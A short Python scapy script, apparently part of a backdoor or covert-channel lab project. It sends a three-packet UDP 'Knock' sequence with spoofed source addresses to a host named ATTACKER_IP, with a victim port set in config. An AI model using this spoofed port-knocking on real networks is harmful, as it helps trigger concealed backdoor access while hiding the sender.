from time import sleep
from scapy.all import *
from scapy.layers.inet import IP, UDP

from config import *

knock_number = 0
knock_timer =0
knock_1 = "192.168.40.4"
knock_2 = "192.168.50.5"
knock_3 = "192.168.60.6"
ALLOWED_TIME_BETWEEN_KNOCKS = 5






def main():
    # Main loop
    packet = IP(dst=ATTACKER_IP, src=knock_1) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
    send(packet)
    sleep(1)
    packet = IP(dst=ATTACKER_IP, src=knock_2) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
    send(packet)
    sleep(1)
    packet = IP(dst=ATTACKER_IP, src=knock_3) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / "Knock"
    send(packet)




if __name__ == '__main__':
    main()